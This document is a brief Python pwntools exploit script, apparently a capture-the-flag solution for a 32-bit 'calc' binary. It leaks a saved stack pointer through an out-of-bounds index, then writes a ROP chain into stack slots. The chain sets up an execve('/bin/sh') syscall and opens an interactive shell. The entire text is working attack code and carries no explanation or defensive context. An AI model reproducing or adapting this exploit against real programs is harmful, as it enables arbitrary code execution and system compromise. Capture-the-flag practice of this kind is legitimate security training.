from pwn import *

r = process("./calc")

offsets = ["+361", "+362", "+363", "+364", "+365", "+366", "+367", "+368", "+369"]

address = [0x0805c34b, 0xb, 0x080701d0, 0x0, 0x0, 0x0, 0x80, u32(b"/bin"), u32(b"/sh\0")]

# Compute address of prev ebp
r.recv(1024)
r.sendline(b"+360")
prev_ebp = int(r.recv(1024))
address[5] = prev_ebp
#

# Attack
for i in range(len(offsets)):
    print("[!] Address: %s" % hex(address[i]))
    r.sendline(offsets[i].encode())
    leak = int(r.recv(1024))
    print("[!] Leak: %s" % hex(leak))
    offset = address[i] - leak
    print("[!] Offset: %s" % offset)
    p = "%s%+d" % (offsets[i], offset)
    print("[+] Send payload: %s", p)
    r.sendline(p)
    print("===================%s\n==================" % hex(int(r.recv(1024))))
r.sendline()
#

r.interactive()